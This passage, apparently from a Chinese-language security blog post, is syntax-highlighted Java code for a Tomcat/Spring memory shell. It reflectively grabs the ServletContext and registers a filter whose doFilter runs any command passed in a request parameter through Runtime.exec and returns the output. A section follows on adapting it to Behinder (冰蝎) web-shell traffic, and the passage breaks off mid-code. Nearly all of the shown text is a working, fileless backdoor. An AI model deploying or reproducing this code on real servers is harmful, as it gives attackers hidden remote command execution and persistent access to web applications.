&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">filterMaps&lt;/span>&lt;span style="color:#f92672">[&lt;/span>&lt;span style="color:#111">i&lt;/span>&lt;span style="color:#f92672">]&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">tmpFilterMaps&lt;/span>&lt;span style="color:#f92672">[&lt;/span>&lt;span style="color:#111">i&lt;/span>&lt;span style="color:#f92672">];&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span> &lt;span style="color:#00a8c8">catch&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Exception&lt;/span> &lt;span style="color:#111">e&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// e.printStackTrace();
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">private&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#111">ServletContext&lt;/span> &lt;span style="color:#75af00">getServletContext&lt;/span>&lt;span style="color:#f92672">()&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">NoSuchFieldException&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">IllegalAccessException&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">ClassNotFoundException&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">ServletRequest&lt;/span> &lt;span style="color:#111">servletRequest&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Class&lt;/span> &lt;span style="color:#111">c&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">Class&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">forName&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;org.apache.catalina.core.ApplicationFilterChain&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">java&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">lang&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">reflect&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">Field&lt;/span> &lt;span style="color:#111">f&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">c&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getDeclaredField&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;lastServicedRequest&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">f&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">setAccessible&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">true&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">ThreadLocal&lt;/span> &lt;span style="color:#111">threadLocal&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">ThreadLocal&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#111">f&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">get&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">threadLocal&lt;/span> &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#00a8c8">null&lt;/span> &lt;span style="color:#f92672">&amp;amp;&amp;amp;&lt;/span> &lt;span style="color:#111">threadLocal&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">get&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">servletRequest&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">ServletRequest&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#111">threadLocal&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">get&lt;/span>&lt;span style="color:#f92672">();&lt;/span> &lt;span style="color:#75715e">// 证明前半部分成功
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// 如果失败则换其他方式
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#75715e">// spring获取法1
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">servletRequest&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">try&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">c&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">Class&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">forName&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;org.springframework.web.context.request.RequestContextHolder&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Method&lt;/span> &lt;span style="color:#111">m&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">c&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getMethod&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;getRequestAttributes&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Object&lt;/span> &lt;span style="color:#111">o&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">m&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">invoke&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">c&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">Class&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">forName&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;org.springframework.web.context.request.ServletRequestAttributes&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">m&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">c&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getMethod&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;getRequest&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">servletRequest&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">ServletRequest&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#111">m&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">invoke&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">o&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span> &lt;span style="color:#00a8c8">catch&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Throwable&lt;/span> &lt;span style="color:#111">t&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">servletRequest&lt;/span> &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">servletRequest&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getServletContext&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// spring获取法2
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#00a8c8">try&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">c&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">Class&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">forName&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;org.springframework.web.context.ContextLoader&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Method&lt;/span> &lt;span style="color:#111">m&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">c&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getMethod&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;getCurrentWebApplicationContext&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Object&lt;/span> &lt;span style="color:#111">o&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">m&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">invoke&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">c&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">Class&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">forName&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;org.springframework.web.context.WebApplicationContext&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">m&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">c&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getMethod&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;getServletContext&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">ServletContext&lt;/span> &lt;span style="color:#111">servletContext&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">ServletContext&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#111">m&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">invoke&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">o&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">servletContext&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span> &lt;span style="color:#00a8c8">catch&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Throwable&lt;/span> &lt;span style="color:#111">t&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">@Override&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">transform&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">DOM&lt;/span> &lt;span style="color:#111">document&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">SerializationHandler&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">handlers&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">TransletException&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">@Override&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">transform&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">DOM&lt;/span> &lt;span style="color:#111">document&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">DTMAxisIterator&lt;/span> &lt;span style="color:#111">iterator&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">SerializationHandler&lt;/span> &lt;span style="color:#111">handler&lt;/span>&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">TransletException&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">@Override&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">init&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">FilterConfig&lt;/span> &lt;span style="color:#111">filterConfig&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">ServletException&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">@Override&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">doFilter&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">ServletRequest&lt;/span> &lt;span style="color:#111">servletRequest&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">ServletResponse&lt;/span> &lt;span style="color:#111">servletResponse&lt;/span>&lt;span style="color:#f92672">,&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">FilterChain&lt;/span> &lt;span style="color:#111">filterChain&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">IOException&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">ServletException&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// System.out.println(&amp;#34;TomcatShellInject doFilter..........&amp;#34;);
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">cmd&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#f92672">((&lt;/span>&lt;span style="color:#111">cmd&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">servletRequest&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getParameter&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">cmdParamName&lt;/span>&lt;span style="color:#f92672">))&lt;/span> &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Process&lt;/span> &lt;span style="color:#111">process&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">Runtime&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getRuntime&lt;/span>&lt;span style="color:#f92672">().&lt;/span>&lt;span style="color:#75af00">exec&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">cmd&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">java&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">io&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">BufferedReader&lt;/span> &lt;span style="color:#111">bufferedReader&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">java&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">io&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">BufferedReader&lt;/span>&lt;span style="color:#f92672">(&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">java&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">io&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">InputStreamReader&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">process&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getInputStream&lt;/span>&lt;span style="color:#f92672">()));&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">StringBuilder&lt;/span> &lt;span style="color:#111">stringBuilder&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">StringBuilder&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">line&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">while&lt;/span> &lt;span style="color:#f92672">((&lt;/span>&lt;span style="color:#111">line&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">bufferedReader&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">readLine&lt;/span>&lt;span style="color:#f92672">())&lt;/span> &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">stringBuilder&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">append&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">line&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#d88200">&amp;#39;\n&amp;#39;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">servletResponse&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getOutputStream&lt;/span>&lt;span style="color:#f92672">().&lt;/span>&lt;span style="color:#75af00">write&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">stringBuilder&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">toString&lt;/span>&lt;span style="color:#f92672">().&lt;/span>&lt;span style="color:#75af00">getBytes&lt;/span>&lt;span style="color:#f92672">());&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">servletResponse&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getOutputStream&lt;/span>&lt;span style="color:#f92672">().&lt;/span>&lt;span style="color:#75af00">flush&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">servletResponse&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getOutputStream&lt;/span>&lt;span style="color:#f92672">().&lt;/span>&lt;span style="color:#75af00">close&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">filterChain&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">doFilter&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">servletRequest&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">servletResponse&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">@Override&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">destroy&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="接入冰蝎">接入冰蝎&lt;/h3>
&lt;p>只需要在我们重写的&lt;code>doFilter&lt;/code>部分多加一个if来适配冰蝎流量的逻辑即可接入冰蝎，代码部分详细分析参见Y4er师傅的&lt;a href="https://y4er.com/post/java-deserialization-inject-behinder-memshell-note/">Java反序列化注入冰蝎内存马相关踩坑笔记&lt;/a>&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// omit
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#00a8c8">else&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">HttpServletRequest&lt;/span> &lt;span style="color:#111">request&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">HttpServletRequest&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#111">servletRequest&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">HttpServletResponse&lt;/span> &lt;span style="color:#111">response&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">HttpServletResponse&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#111">servletResponse&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
